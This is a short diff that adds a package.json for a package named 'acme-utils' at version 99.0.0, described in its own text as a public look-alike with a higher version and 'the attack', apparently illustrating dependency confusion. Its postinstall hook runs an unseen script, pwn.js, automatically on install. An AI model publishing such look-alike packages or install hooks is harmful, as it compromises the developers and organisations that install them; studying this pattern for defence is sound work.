@@ -1,0 +1,7 @@
+{
+  "name": "acme-utils",
+  "version": "99.0.0",
+  "description": "Public look-alike with a higher version — this is the attack",
+  "main": "index.js",
+  "scripts": { "postinstall": "node pwn.js" }
+}
